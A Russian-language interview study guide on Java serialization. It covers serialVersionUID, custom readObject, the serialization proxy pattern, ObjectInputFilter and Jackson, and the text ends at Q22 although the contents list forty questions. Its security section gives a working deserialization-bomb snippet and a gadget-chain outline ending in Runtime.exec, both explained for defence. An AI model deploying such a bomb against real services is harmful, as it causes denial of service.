---
title: "Вопросы на собеседовании: Java Serialization"
description: "Полное руководство по вопросам собеседования на тему сериализации в Java: Serializable, Externalizable, serialVersionUID, transient, custom serialization, serialization proxy pattern, безопасность десериализации, ObjectInputFilter, Jackson, Gson, Protobuf, Avro, Kryo, records, sealed classes."
tags:
  - interview
  - programming-languages
  - java-serialization-interview
difficulty: "intermediate"
aliases:
  - "Java Serialization interview"
  - "Java Serialization собеседование"
  - "сериализация Java"
  - "десериализация Java"
updated: "2026-04-13"
---
# Вопросы на собеседовании: `Java Serialization`

Полное руководство по вопросам собеседования на тему сериализации в `Java`. Охватывает стандартный механизм (`Serializable`, `Externalizable`), управление совместимостью (`serialVersionUID`), кастомную сериализацию, паттерн `Serialization Proxy`, безопасность десериализации, `ObjectInputFilter`, JSON-сериализацию (`Jackson`, `Gson`), сериализацию `record` и `sealed` классов, а также альтернативные форматы (`Protobuf`, `Avro`, `Kryo`).

## Полезные ссылки

### Официальная документация

- [Java Object Serialization Specification](https://docs.oracle.com/en/java/javase/17/docs/specs/serialization/index.html) — спецификация механизма сериализации
- [Serializable (Javadoc)](https://docs.oracle.com/en/java/javase/17/docs/api/java.base/java/io/Serializable.html) — документация маркерного интерфейса
- [ObjectInputFilter (Javadoc)](https://docs.oracle.com/en/java/javase/17/docs/api/java.base/java/io/ObjectInputFilter.html) — фильтрация при десериализации
- [Jackson Documentation](https://github.com/FasterXML/jackson-docs) — документация Jackson
- [Protocol Buffers Language Guide](https://protobuf.dev/programming-guides/proto3/) — руководство по Protobuf

### Baeldung

- [Introduction to Java Serialization — Baeldung](https://www.baeldung.com/java-serialization) — основы сериализации: ObjectOutputStream, ObjectInputStream
- [Deserialization Vulnerabilities in Java — Baeldung](https://www.baeldung.com/java-deserialization-vulnerabilities) — уязвимости десериализации и защита
- [Intro to the Jackson ObjectMapper — Baeldung](https://www.baeldung.com/jackson-object-mapper-tutorial) — сериализация/десериализация JSON через Jackson
- [Different Serialization Approaches for Java — Baeldung](https://www.baeldung.com/java-serialization-approaches) — сравнение подходов: Java, JSON, Protobuf, Kryo

## Содержание

- [Полезные ссылки](#полезные-ссылки)
- [See also](#see-also)

**Основы: `Serializable`, `serialVersionUID`, `transient`**
- [Q1. (!) Что такое сериализация и зачем она нужна?](#q1--что-такое-сериализация-и-зачем-она-нужна)
- [Q2. (!) Что такое маркерный интерфейс `Serializable`?](#q2--что-такое-маркерный-интерфейс-serializable)
- [Q3. (!) Что такое `serialVersionUID` и когда его задавать?](#q3--что-такое-serialversionuid-и-когда-его-задавать)
- [Q4. Какие поля не сериализуются (`transient`, `static`)?](#q4-какие-поля-не-сериализуются-transient-static)
- [Q5. Что происходит с совместимостью при изменении класса между версиями?](#q5-что-происходит-с-совместимостью-при-изменении-класса-между-версиями)

**`Externalizable`, наследование, специальные методы**
- [Q6. (!) Что такое `Externalizable` и чем отличается от `Serializable`?](#q6--что-такое-externalizable-и-чем-отличается-от-serializable)
- [Q7. Как сериализуется наследование (родитель не `Serializable`)?](#q7-как-сериализуется-наследование-родитель-не-serializable)
- [Q8. Как сериализовать объект в файл и обратно?](#q8-как-сериализовать-объект-в-файл-и-обратно)
- [Q9. (!) Что такое `writeReplace` и `readResolve`?](#q9--что-такое-writereplace-и-readresolve)

**Кастомная сериализация: `writeObject`/`readObject`**
- [Q10. (!) Как использовать custom `writeObject`/`readObject`?](#q10--как-использовать-custom-writeobjectreadobject)
- [Q11. Как правильно валидировать данные в `readObject`?](#q11-как-правильно-валидировать-данные-в-readobject)
- [Q12. Как сериализовать `enum` в `Java`?](#q12-как-сериализовать-enum-в-java)

**Serialization Proxy Pattern**
- [Q13. (!) Что такое `Serialization Proxy Pattern` и зачем он нужен?](#q13--что-такое-serialization-proxy-pattern-и-зачем-он-нужен)
- [Q14. Какие плюсы и минусы у `Serialization Proxy Pattern`?](#q14-какие-плюсы-и-минусы-у-serialization-proxy-pattern)

**Безопасность десериализации**
- [Q15. (!) Какие риски безопасности у `Java Serialization`?](#q15--какие-риски-безопасности-у-java-serialization)
- [Q16. (!) Что такое gadget chain и как работают атаки десериализации?](#q16--что-такое-gadget-chain-и-как-работают-атаки-десериализации)
- [Q17. (!) Что такое `ObjectInputFilter` и как его настроить?](#q17--что-такое-objectinputfilter-и-как-его-настроить)
- [Q18. Как защитить приложение от атак десериализации?](#q18-как-защитить-приложение-от-атак-десериализации)

**Сериализация `record` и `sealed` классов**
- [Q19. (!) Как сериализуются `record` классы в `Java`?](#q19--как-сериализуются-record-классы-в-java)
- [Q20. Как работает сериализация с `sealed` классами?](#q20-как-работает-сериализация-с-sealed-классами)

**JSON-сериализация: `Jackson`, `Gson`**
- [Q21. (!) Как работает `Jackson` и его основные аннотации?](#q21--как-работает-jackson-и-его-основные-аннотации)
- [Q22. Чем `Jackson` отличается от `Gson`?](#q22-чем-jackson-отличается-от-gson)
- [Q23. Как обрабатывать полиморфизм при JSON-сериализации в `Jackson`?](#q23-как-обрабатывать-полиморфизм-при-json-сериализации-в-jackson)
- [Q24. Как настроить кастомный сериализатор/десериализатор в `Jackson`?](#q24-как-настроить-кастомный-сериализатордесериализатор-в-jackson)
- [Q25. Какие проблемы безопасности есть у JSON-десериализации?](#q25-какие-проблемы-безопасности-есть-у-json-десериализации)

**Альтернативные форматы: `Protobuf`, `Avro`, `Kryo`**
- [Q26. (!) Что такое `Protocol Buffers` и когда их использовать?](#q26--что-такое-protocol-buffers-и-когда-их-использовать)
- [Q27. Что такое `Apache Avro` и чем он отличается от `Protobuf`?](#q27-что-такое-apache-avro-и-чем-он-отличается-от-protobuf)
- [Q28. Что такое `Kryo` и когда его выбирают?](#q28-что-такое-kryo-и-когда-его-выбирают)
- [Q29. (!) Как выбрать формат сериализации для проекта?](#q29--как-выбрать-формат-сериализации-для-проекта)

**Сериализация в микросервисах**
- [Q30. (!) Почему в микросервисах обычно избегают `Java Serialization`?](#q30--почему-в-микросервисах-обычно-избегают-java-serialization)
- [Q31. Как организовать версионирование схем в микросервисной архитектуре?](#q31-как-организовать-версионирование-схем-в-микросервисной-архитектуре)
- [Q32. Как сериализация связана с паттернами обмена сообщениями?](#q32-как-сериализация-связана-с-паттернами-обмена-сообщениями)

**Безопасность и продвинутые механизмы**
- [Q33. (!) Десериализация как вектор атаки — OWASP и реальные эксплойты](#q33--десериализация-как-вектор-атаки--owasp-и-реальные-эксплойты)
- [Q34. (!) Как `readResolve()` обеспечивает Singleton при десериализации?](#q34--как-readresolve-обеспечивает-singleton-при-десериализации)
- [Q35. Что такое `serialPersistentFields` и когда его использовать?](#q35-что-такое-serialpersistentfields-и-когда-его-использовать)
- [Q36. Как сериализация работает с наследованием и `abstract class`?](#q36-как-сериализация-работает-с-наследованием-и-abstract-class)

**Сериализация в Spring и альтернативные фреймворки**
- [Q37. (!) Как Spring обрабатывает сериализацию через `HttpMessageConverter`?](#q37--как-spring-обрабатывает-сериализацию-через-httpmessageconverter)
- [Q38. (!) Jackson vs Gson — углублённое сравнение для Spring-проектов](#q38--jackson-vs-gson--углублённое-сравнение-для-spring-проектов)
- [Q39. FST — быстрый аналог Java Serialization](#q39-fst--быстрый-аналог-java-serialization)
- [Q40. Как сериализуются `Java Record` — детали механизма](#q40-как-сериализуются-java-record--детали-механизма)

---

## Q1. (!) Что такое сериализация и зачем она нужна?

**Сериализация** — это преобразование объекта в поток байтов (или в другой формат), чтобы его можно было сохранить на диск, передать по сети или положить в кэш. Обратный процесс восстановления объекта из потока называется **десериализацией**. В `Java` стандартный механизм — классы `ObjectOutputStream` и `ObjectInputStream`, работающие с бинарным форматом, специфичным для `JVM`.

```mermaid
graph LR
    A[Java Object] -->|ObjectOutputStream| B[Byte Stream]
    B -->|Файл / Сеть / Кэш| C[Хранилище]
    C -->|ObjectInputStream| D[Java Object]
    style A fill:#e1f5fe
    style D fill:#e1f5fe
    style B fill:#fff3e0
    style C fill:#f3e5f5
```

Основные сценарии использования:
- **Персистентность** — сохранение состояния приложения (сессии, чекпоинты)
- **RMI** — удалённый вызов методов между JVM
- **Кэширование** — сохранение объектов в распределённых кэшах (`Redis`, `Hazelcast`)
- **Очереди сообщений** — передача объектов через [Kafka](../../messaging/kafka-interview.md), `RabbitMQ`

Важно понимать, что бинарная Java-сериализация привязана к платформе и к версии класса. Для межсистемного обмена и современных сервисов чаще применяют альтернативы: `JSON`, `XML`, `Protocol Buffers` — они не выполняют произвольный код при десериализации и обычно безопаснее.

## Q2. (!) Что такое маркерный интерфейс `Serializable`?

`Serializable` — это маркерный интерфейс в пакете `java.io`: у него нет методов, он лишь помечает класс как допускающий сериализацию. Класс должен реализовать `Serializable`, чтобы `JVM` разрешила записывать его экземпляры через `ObjectOutputStream`. Если попытаться сериализовать объект класса без этого интерфейса, будет выброшено `NotSerializableException`.

Все подклассы сериализуемого класса автоматически считаются сериализуемыми. Если в классе есть поля ссылочных типов, их классы тоже должны быть сериализуемы (или поля помечены `transient`). Несериализуемые поля либо объявляют `transient`, либо обеспечивают их инициализацию через методы `readObject` / `readResolve`.

```java
public class User implements Serializable {
    private static final long serialVersionUID = 1L;
    private final String name;
    private final int age;
    private transient Logger log = LoggerFactory.getLogger(User.class); // не сериализуется

    public User(String name, int age) {
        this.name = name;
        this.age = age;
    }
}
// Без Serializable при writeObject(obj) — NotSerializableException
```

На собеседовании часто спрашивают: *"Почему `Serializable` — маркерный, а не содержит методы?"* Ответ: стандартный механизм использует рефлексию для чтения полей, поэтому методы не нужны. Но если нужен контроль — используются приватные методы `writeObject`/`readObject` или интерфейс `Externalizable`.

## Q3. (!) Что такое `serialVersionUID` и когда его задавать?

`serialVersionUID` — это число типа `long`, которое идентифицирует версию сериализованного класса. При десериализации, если UID в потоке не совпадает с UID класса в `JVM`, выбрасывается `InvalidClassException`.

Если разработчик **не задаёт** `serialVersionUID` явно, `JVM` вычисляет его на основе сигнатур полей, методов, суперклассов и интерфейсов. При любом изменении класса (даже добавлении `private` метода) это значение может измениться, и старые данные перестанут десериализоваться.

```java
// Рекомендация: всегда задавать явно
private static final long serialVersionUID = 1L;
```

**Стратегия управления:**

| Изменение | Действие с `serialVersionUID` |
|-----------|-------------------------------|
| Добавление поля с default-значением | Оставить тем же |
| Добавление `transient` поля | Оставить тем же |
| Удаление поля | Осторожно — можно оставить, но данные потеряются |
| Смена типа поля | Изменить UID (несовместимое изменение) |
| Переименование поля | Изменить UID |

Joshua Bloch в *Effective Java* рекомендует **всегда** явно задавать `serialVersionUID` в каждом `Serializable`-классе.

## Q4. Какие поля не сериализуются (`transient`, `static`)?

Поля с модификатором **`transient`** не записываются в поток сериализации. При десериализации им присваиваются значения по умолчанию: `null` для ссылок, `0` для чисел, `false` для `boolean`.

**Статические** (`static`) поля не сериализуются — они принадлежат классу, а не экземпляру.

Типичные кандидаты на `transient`:
- Логгеры (`Logger`)
- Кэши и вычисляемые поля
- Ресурсы (`Connection`, `Socket`, `InputStream`)
- Пароли и чувствительные данные

```java
public class CachedResult implements Serializable {
    private static final long serialVersionUID = 1L;
    private final String data;
    private transient volatile Object cache;       // не сериализуется → null
    private transient Logger log;                   // не сериализуется → null
    private static int instanceCount;               // не сериализуется (static)

    // восстанавливаем transient-поля после десериализации
    private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
        ois.defaultReadObject();
        this.cache = compute(data);
        this.log = LoggerFactory.getLogger(CachedResult.class);
    }
}
```

## Q5. Что происходит с совместимостью при изменении класса между версиями?

Совместимость сериализации определяется `serialVersionUID` и правилами совместимых/несовместимых изменений.

**Совместимые изменения** (не ломают десериализацию при том же UID):
- Добавление нового поля — при десериализации старых данных получит значение по умолчанию
- Добавление `writeObject`/`readObject` методов
- Изменение модификатора доступа поля
- Добавление/удаление `transient` модификатора

**Несовместимые изменения** (требуют смены UID):
- Удаление поля (данные потеряны)
- Перемещение класса по иерархии наследования
- Смена типа примитивного поля (например, `int` → `long`)
- Изменение `Serializable` на `Externalizable` и наоборот

```mermaid
graph TD
    A[Класс v1<br/>serialVersionUID = 1L] -->|Добавление поля| B[Класс v2<br/>serialVersionUID = 1L<br/>✅ совместимо]
    A -->|Смена типа поля| C[Класс v2<br/>serialVersionUID = 2L<br/>❌ несовместимо]
    B -->|Десериализация v1 данных| D[Новое поле = default]
    C -->|Десериализация v1 данных| E[InvalidClassException]
    style B fill:#c8e6c9
    style C fill:#ffcdd2
```

Для долгоживущих форматов рекомендуется переходить на форматы с явным версионированием схем (`Protobuf`, `Avro`), где эволюция модели управляется через схемы, а не через поведение `JVM`.

## Q6. (!) Что такое `Externalizable` и чем отличается от `Serializable`?

`Externalizable` расширяет `Serializable` и добавляет два метода: `writeExternal(ObjectOutput out)` и `readExternal(ObjectInput in)`. Класс сам решает, какие поля и в каком порядке записывать и читать.

| Характеристика | `Serializable` | `Externalizable` |
|----------------|----------------|-------------------|
| Контроль | Автоматический (рефлексия) | Полный (ручной) |
| No-arg конструктор | Не требуется | **Обязателен** (public) |
| Производительность | Медленнее (рефлексия) | Быстрее |
| Размер потока | Больше (метаданные) | Меньше (только данные) |
| `transient` | Учитывается | Игнорируется (управление вручную) |
| Сложность | Низкая | Высокая |

```java
public class CompactDto implements Externalizable {
    private String name;
    private int id;

    public CompactDto() {}  // обязателен для десериализации

    @Override
    public void writeExternal(ObjectOutput out) throws IOException {
        out.writeUTF(name);
        out.writeInt(id);
    }

    @Override
    public void readExternal(ObjectInput in) throws IOException {
        name = in.readUTF();
        id = in.readInt();
    }
}
```

Из-за ручного поддержания совместимости `Externalizable` используют реже. В современных проектах для оптимизации размера и скорости обычно выбирают `Protobuf` или `Kryo`, а не `Externalizable`.

## Q7. Как сериализуется наследование (родитель не `Serializable`)?

Если родительский класс **не** реализует `Serializable`, при сериализации объекта-потомка в поток попадают только поля потомка. Поля родителя не сохраняются. При десериализации `JVM` вызывает **конструктор по умолчанию** родительского класса, поэтому у него **обязан** быть доступный no-arg конструктор (иначе `InvalidClassException`).

```mermaid
graph TB
    A[Object] -->|no-arg конструктор| B[Parent<br/>❌ не Serializable<br/>поля НЕ сохраняются]
    B -->|extends| C[Child implements Serializable<br/>✅ поля сохраняются]
    style B fill:#ffcdd2
    style C fill:#c8e6c9
```

Если родитель сам реализует `Serializable`, его поля сериализуются вместе с потомком: граф идёт от родителя к потомку. Инициализация при десериализации идёт без вызова обычных конструкторов — поля восстанавливаются из потока.

```java
class Animal {
    String species;
    Animal() { this.species = "unknown"; } // обязателен!
}

class Dog extends Animal implements Serializable {
    private static final long serialVersionUID = 1L;
    String name;
    // species НЕ сохранится при сериализации
    // после десериализации species = "unknown" (из конструктора Animal)
}
```

## Q8. Как сериализовать объект в файл и обратно?

Сериализация выполняется через связку `FileOutputStream` + `ObjectOutputStream`, десериализация — через `FileInputStream` + `ObjectInputStream`. Обязательно использовать `try-with-resources` для закрытия потоков.

```java
// Запись
try (var fos = new FileOutputStream("data.ser");
     var oos = new ObjectOutputStream(fos)) {
    oos.writeObject(user);
}

// Чтение
try (var fis = new FileInputStream("data.ser");
     var ois = new ObjectInputStream(fis)) {
    User user = (User) ois.readObject();
}
```

Важные нюансы:
- `readObject()` возвращает `Object` — нужно приведение типа
- Обрабатывать `IOException` и `ClassNotFoundException`
- При записи нескольких объектов — соблюдать тот же порядок при чтении
- Для больших графов объектов может потребоваться значительный объём памяти

## Q9. (!) Что такое `writeReplace` и `readResolve`?

Это специальные методы, позволяющие подменить объект при сериализации/десериализации.

**`writeReplace()`** — вызывается **до** записи объекта в поток. Возвращённый объект сериализуется вместо исходного. Позволяет подменить объект на прокси или маркер.

**`readResolve()`** — вызывается **после** десериализации. Возвращённый объект заменяет десериализованный. Классическое применение — **синглтоны**: при десериализации создаётся новый экземпляр, но `readResolve()` возвращает единственный существующий.

```mermaid
sequenceDiagram
    participant App
    participant OOS as ObjectOutputStream
    participant Stream as Byte Stream
    participant OIS as ObjectInputStream

    App->>OOS: writeObject(obj)
    OOS->>OOS: obj.writeReplace() → proxy
    OOS->>Stream: serialize(proxy)
    Stream->>OIS: readObject()
    OIS->>OIS: deserialize → proxy
    OIS->>OIS: proxy.readResolve() → obj
    OIS->>App: return obj
```

```java
public class Singleton implements Serializable {
    private static final long serialVersionUID = 1L;
    public static final Singleton INSTANCE = new Singleton();

    private Singleton() {}

    // при десериализации вернуть единственный экземпляр
    private Object readResolve() {
        return INSTANCE;
    }
}
```

Без `readResolve` десериализация синглтона создаст **второй экземпляр**, нарушив контракт единственности. Это одна из причин, почему `enum`-синглтоны считаются более надёжным подходом (см. [паттерны проектирования](../../design-patterns/design-patterns-interview.md)).

## Q10. (!) Как использовать custom `writeObject`/`readObject`?

Кастомные методы позволяют добавить логику при сериализации/десериализации, не переходя на `Externalizable`. Сигнатура должна быть **строго определённой** — `JVM` находит их через рефлексию.

```java
public class SecureData implements Serializable {
    private static final long serialVersionUID = 1L;
    private String publicData;
    private transient String sensitiveData;

    // Сигнатура ОБЯЗАТЕЛЬНА: private void writeObject(ObjectOutputStream)
    private void writeObject(ObjectOutputStream oos) throws IOException {
        oos.defaultWriteObject();              // записать все не-transient поля
        oos.writeObject(encrypt(sensitiveData)); // дополнительная логика
    }

    // Сигнатура ОБЯЗАТЕЛЬНА: private void readObject(ObjectInputStream)
    private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
        ois.defaultReadObject();               // прочитать все не-transient поля
        this.sensitiveData = decrypt((String) ois.readObject());
    }

    private String encrypt(String data) { /* ... */ return data; }
    private String decrypt(String data) { /* ... */ return data; }
}
```

Ключевые правила:
1. Вызывать `defaultWriteObject()`/`defaultReadObject()` **первыми** — это обеспечивает совместимость с добавлением новых полей
2. Порядок записи и чтения дополнительных данных должен совпадать
3. Методы должны быть `private` — иначе `JVM` их не обнаружит
4. В `readObject` обязательно **валидировать** восстановленные данные

## Q11. Как правильно валидировать данные в `readObject`?

`readObject` — это фактически ещё один публичный конструктор, создающий объект из потока байтов. Без валидации атакующий может создать объект в невалидном состоянии, минуя все проверки обычных конструкторов.

```java
public class Period implements Serializable {
    private static final long serialVersionUID = 1L;
    private final Date start;
    private final Date end;

    public Period(Date start, Date end) {
        if (start.compareTo(end) > 0)
            throw new IllegalArgumentException("start > end");
        this.start = new Date(start.getTime()); // defensive copy
        this.end = new Date(end.getTime());
    }

    private void readObject(ObjectInputStream ois)
            throws IOException, ClassNotFoundException {
        ois.defaultReadObject();

        // 1. Валидация инвариантов — как в конструкторе!
        if (start.compareTo(end) > 0)
            throw new InvalidObjectException("start > end");

        // 2. Defensive copy мутабельных полей
        // (для final полей — через Serialization Proxy)
    }
}
```

Рекомендации Joshua Bloch (*Effective Java*, Item 88):
- Валидировать **все** инварианты после `defaultReadObject()`
- При нарушении бросать `InvalidObjectException`
- Делать defensive copy мутабельных полей
- Не вызывать переопределяемые методы в `readObject`

## Q12. Как сериализовать `enum` в `Java`?

Константы перечислений сериализуются **по имени**, а не по полям. В поток записывается только имя константы; при десериализации вызывается `Enum.valueOf(класс, имя)`, возвращая тот же экземпляр.

```java
public enum Status { ACTIVE, INACTIVE }
// сериализуется как "ACTIVE" или "INACTIVE"
```

Важные особенности:
- Дополнительные поля у `enum` **не записываются** при стандартной сериализации
- Кастомная сериализация для `enum` не поддерживается (`writeObject`/`readObject` игнорируются)
- `enum` гарантирует идентичность экземпляров после десериализации (в отличие от обычных классов)
- Именно поэтому `enum` — **лучший способ реализации синглтона** в `Java` (Effective Java, Item 3)

## Q13. (!) Что такое `Serialization Proxy Pattern` и зачем он нужен?

`Serialization Proxy Pattern` (Effective Java, Item 90) — это паттерн, при котором вместо самого объекта сериализуется **приватный вложенный класс-прокси**, содержащий только данные для восстановления объекта. Это решает большинство проблем стандартной сериализации: безопасность, инварианты, `final` поля.

```java
public class Period implements Serializable {
    private final Date start;
    private final Date end;

    public Period(Date start, Date end) {
        if (start.compareTo(end) > 0)
            throw new IllegalArgumentException("start > end");
        this.start = new Date(start.getTime());
        this.end = new Date(end.getTime());
    }

    // 1. Подменяем объект на прокси перед сериализацией
    private Object writeReplace() {
        return new SerializationProxy(this);
    }

    // 2. Запрещаем прямую десериализацию основного класса
    private void readObject(ObjectInputStream stream)
            throws InvalidObjectException {
        throw new InvalidObjectException("Proxy required");
    }

    // 3. Приватный прокси с данными
    private static class SerializationProxy implements Serializable {
        private static final long serialVersionUID = 1L;
        private final Date start;
        private final Date end;

        SerializationProxy(Period p) {
            this.start = p.start;
            this.end = p.end;
        }

        // 4. Восстановление через обычный конструктор
        private Object readResolve() {
            return new Period(start, end); // валидация и defensive copy!
        }
    }
}
```

```mermaid
sequenceDiagram
    participant Obj as Period
    participant Proxy as SerializationProxy
    participant Stream as Byte Stream

    Note over Obj: writeReplace()
    Obj->>Proxy: создать прокси с данными
    Proxy->>Stream: сериализация прокси

    Note over Stream: десериализация
    Stream->>Proxy: восстановить прокси
    Note over Proxy: readResolve()
    Proxy->>Obj: new Period(start, end)
    Note over Obj: Валидация в конструкторе!
```

## Q14. Какие плюсы и минусы у `Serialization Proxy Pattern`?

**Преимущества:**
- Объект восстанавливается через **обычный конструктор** — все инварианты проверяются
- Работает с `final` полями (в отличие от кастомного `readObject`)
- Защищает от атак — прямая десериализация основного класса запрещена
- Не зависит от внутренней структуры класса

**Недостатки:**
- Не совместим с классами, которые расширяются подклассами (прокси вернёт родительский тип)
- Небольшой overhead по производительности (~14% по данным Bloch)
- Не работает, если класс содержит циклические ссылки на себя

На собеседовании этот вопрос показывает глубокое понимание проблем сериализации. Если кандидат знает Serialization Proxy — это признак того, что он читал *Effective Java* и понимает trade-offs.

## Q15. (!) Какие риски безопасности у `Java Serialization`?

Десериализация произвольного потока байтов — одна из самых опасных операций в `Java`. Основные риски:

1. **Remote Code Execution (RCE)** — атакующий формирует поток так, чтобы при чтении объектов вызывались опасные цепочки вызовов (gadget chains)
2. **Denial of Service (DoS)** — специально сконструированный поток может вызвать бесконечный цикл, `OutOfMemoryError` или высокое потребление CPU
3. **Нарушение инвариантов** — создание объектов в невалидном состоянии, минуя конструкторы

Пример DoS-атаки (так называемая *deserialization bomb*):

```java
// Создаёт объект, десериализация которого требует вычисления 2^100 хэшей
Set<Object> root = new HashSet<>();
Set<Object> s1 = root, s2 = new HashSet<>();
for (int i = 0; i < 100; i++) {
    Set<Object> t1 = new HashSet<>(), t2 = new HashSet<>();
    t1.add("foo"); // заставляет hashCode() вычисляться
    s1.add(t1); s1.add(t2);
    s2.add(t1); s2.add(t2);
    s1 = t1; s2 = t2;
}
```

Подробнее о [безопасности приложений](../../security/application-security-interview.md).

## Q16. (!) Что такое gadget chain и как работают атаки десериализации?

**Gadget chain** (цепочка гаджетов) — это последовательность вызовов существующих методов в библиотеках на classpath, которая приводит к выполнению произвольного кода. Атакующий не добавляет свой код — он использует уже существующие классы.

```mermaid
graph LR
    A[Вредоносный<br/>byte stream] -->|readObject| B[HashMap]
    B -->|hashCode| C[TiedMapEntry]
    C -->|getValue| D[LazyMap]
    D -->|get → transform| E[InvokerTransformer]
    E -->|invoke| F[Runtime.exec<br/>🔴 Произвольный код]
    style A fill:#ffcdd2
    style F fill:#ffcdd2
```

Известные библиотеки с gadget chains:
- **Apache Commons Collections** — `InvokerTransformer`, `ChainedTransformer`
- **Spring Framework** — `MethodInvokeTypeProvider`
- **Groovy** — `MethodClosure`
- **Commons BeanUtils** — `BeanComparator`

Инструменты для обнаружения: **ysoserial** (генератор эксплойтов), **GadgetInspector** (статический анализ classpath).

Ключевой принцип: **никогда не десериализовать данные из ненадёжных источников** стандартным `ObjectInputStream`.

## Q17. (!) Что такое `ObjectInputFilter` и как его настроить?

`ObjectInputFilter` (появился в `Java` 9, backport в 8u121) — механизм фильтрации классов при десериализации. Позволяет задать белый/чёрный список классов и ограничения на сложность графа объектов.

```java
// Вариант 1: Фильтр через паттерн
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
    "com.example.dto.*;!*"  // разрешить только классы из com.example.dto
);

try (var ois = new ObjectInputStream(inputStream)) {
    ois.setObjectInputFilter(filter);
    var obj = ois.readObject();
}

// Вариант 2: Программный фильтр
ObjectInputFilter programFilter = info -> {
    if (info.serialClass() != null) {
        String name = info.serialClass().getName();
        if (!name.startsWith("com.example.dto.")) {
            return ObjectInputFilter.Status.REJECTED;
        }
    }
    if (info.depth() > 10) return ObjectInputFilter.Status.REJECTED;
    if (info.references() > 1000) return ObjectInputFilter.Status.REJECTED;
    return ObjectInputFilter.Status.ALLOWED;
};
```

**Глобальная настройка** через системное свойство (рекомендуется для всего приложения):

```bash
-Djdk.serialFilter="com.example.dto.*;java.base/*;!*"
```

В `Java` 17+ появился **context-specific deserialization filter** (`ObjectInputFilter.Config.setSerialFilterFactory()`), позволяющий задавать фильтры на уровне фреймворка.

Ограничения фильтра:

| Параметр | Описание | Пример |
|----------|----------|--------|
| `maxdepth` | Глубина вложенности | `maxdepth=5` |
| `maxrefs` | Число ссылок | `maxrefs=100` |
| `maxbytes` | Размер потока | `maxbytes=1000000` |
| `maxarray` | Размер массива | `maxarray=10000` |

## Q18. Как защитить приложение от атак десериализации?

Комплексный подход к защите:

1. **Не использовать Java Serialization** для приёма данных извне (предпочитать JSON/Protobuf)
2. **`ObjectInputFilter`** — если десериализация неизбежна, настроить белый список
3. **Serialization Proxy Pattern** — исключает прямую десериализацию класса
4. **Обновлять зависимости** — убирать из classpath известные gadget-библиотеки
5. **Мониторинг** — логировать десериализацию через JFR (Java Flight Recorder)
6. **RASP/WAF** — runtime protection на уровне инфраструктуры

```mermaid
graph TD
    A[Входящие данные] --> B{Формат?}
    B -->|JSON/Protobuf| C[✅ Безопасный парсинг]
    B -->|Java Serialization| D{Источник?}
    D -->|Доверенный| E[ObjectInputFilter<br/>+ белый список]
    D -->|Недоверенный| F[🔴 ОТКЛОНИТЬ]
    style C fill:#c8e6c9
    style F fill:#ffcdd2
```

Подробнее о защите от OWASP-уязвимостей: [OWASP Top 10](../../security/owasp-top10-interview.md) (A8:2017 — Insecure Deserialization).

## Q19. (!) Как сериализуются `record` классы в `Java`?

`Record` (Java 16+) по умолчанию **не** реализует `Serializable`. Если добавить `implements Serializable`, механизм сериализации record отличается от обычных классов:

1. Сериализуются **только компоненты** record (то есть поля, объявленные в заголовке)
2. При десериализации используется **канонический конструктор** (а не рефлексия для полей!)
3. Кастомные `writeObject`/`readObject` **игнорируются**
4. `writeReplace`/`readResolve` работают

```java
public record Point(int x, int y) implements Serializable {
    // serialVersionUID рекомендуется для стабильности
    @java.io.Serial
    private static final long serialVersionUID = 1L;

    // Канонический конструктор — вызывается при десериализации!
    public Point {
        if (x < 0 || y < 0) throw new IllegalArgumentException("negative");
    }
}
```

**Преимущества record для сериализации:**
- Валидация в каноническом конструкторе выполняется и при десериализации (в отличие от обычных классов!)
- Нет проблем с `final` полями
- Фактически record реализует Serialization Proxy Pattern «из коробки»
- Аннотация `@java.io.Serial` (Java 14+) позволяет IDE проверять корректность сигнатур

Это делает `record` **самым безопасным** способом стандартной Java-сериализации.

## Q20. Как работает сериализация с `sealed` классами?

`Sealed` классы (Java 17+) ограничивают множество подклассов через `permits`. С точки зрения сериализации sealed-классы работают как обычные, но дают дополнительную безопасность:

```java
public sealed interface Shape extends Serializable
    permits Circle, Rectangle {
}

public record Circle(double radius) implements Shape {}
public record Rectangle(double width, double height) implements Shape {}
```

**Преимущества для сериализации:**
- `ObjectInputFilter` может использовать sealed-иерархию для точного белого списка — вместо `com.example.*` можно перечислить конкретные `permits`-классы
- Компилятор гарантирует, что новые подтипы не появятся незаметно
- В сочетании с `record` — максимальная безопасность: `sealed record` проходит валидацию через канонический конструктор

**Нюанс**: при JSON-сериализации (`Jackson`) для sealed-иерархий нужен дискриминатор типов (`@JsonTypeInfo`), иначе десериализатор не знает, какой из `permits`-классов создавать.

## Q21. (!) Как работает `Jackson` и его основные аннотации?

`Jackson` — де-факто стандартная библиотека JSON-сериализации в Java-экосистеме (используется в `Spring Boot`, `Quarkus`, `Micronaut`). Центральный класс — `ObjectMapper`.

```java
ObjectMapper mapper = new ObjectMapper();

// Сериализация
String json = mapper.writeValueAsString(user);

// Десериализация
User user = mapper.readValue(json, User.class);
```

Ключевые аннотации:

| Аннотация | Назначение |
|-----------|-----------|
| `@JsonProperty("name")` | Задаёт имя поля в JSON |
| `@JsonIgnore` | Исключить поле |
| `@JsonIgnoreProperties` | Игнорировать неизвестные поля |
| `@JsonInclude(NON_NULL)` | Не включать null-поля |
| `@JsonCreator` | Пометить конструктор/фабричный метод для десериализации |
| `@JsonFormat` | Формат даты/числа |
| `@JsonSerialize` / `@JsonDeserialize` | Кастомные сериализаторы |
| `@JsonTypeInfo` | Полиморфная десериализация |
| `@JsonSubTypes` | Перечисление подтипов |

```java
@JsonIgnoreProperties(ignoreUnknown = true)
public class UserDto {
    @JsonProperty("user_name")
    private String name;

    @JsonFormat(pattern = "yyyy-MM-dd")
    private LocalDate birthDate;

    @JsonInclude(JsonInclude.Include.NON_NULL)
    private String middleName;

    @JsonCreator
    public UserDto(@JsonProperty("user_name") String name) {
        this.name = Objects.requireNonNull(name);
    }
}
```

## Q22. Чем `Jackson` отличается от `Gson`?

| Характеристика | `Jackson` | `Gson` |
|----------------|-----------|--------|
| Производительность | Быстрее (потоковый парсинг) | Медленнее |
| Экосистема | Огромная (XML, YAML, CBOR, Avro...) | Только JSON |
| Spring Boot | Встроен по умолчанию | Нужно подключать |
| Аннотации | Богатый набор (`@JsonTypeInfo`, `@JsonView`...) | Минимальный |
| Immutable объекты | `@JsonCreator` + `@JsonProperty` | Требует `TypeAdapter` |
| `record` поддержка | Полная (с 2.12+) | Ограниченная |
| Размер | ~1.7 MB (core + annotations + databind) | ~250 KB |
| Обработка дженериков | `TypeReference<List<User>>()` | `TypeToken<List<User>>()` |
